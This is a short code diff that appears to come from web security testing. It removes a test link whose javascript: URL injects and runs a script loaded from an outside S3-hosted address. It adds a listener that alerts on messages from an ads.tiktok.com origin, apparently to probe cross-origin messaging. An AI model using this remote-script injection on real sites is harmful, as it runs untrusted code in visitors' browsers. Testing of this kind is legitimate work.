@@ -1,1 +1,7 @@
-<a href="javascript:(function(){var script=document.createElement('script');script.src='https://imrannissar.s3.eu-north-1.amazonaws.com/invite.js';document.body.appendChild(script);})();">Tessssssstttt
+window.addEventListener('message', function(event) {
+    if (event.origin === 'https://ads.tiktok.com') {
+        if (event.data) {
+            alert('Message from parent: ' + event.data);
+        }
+    }
+}, false);
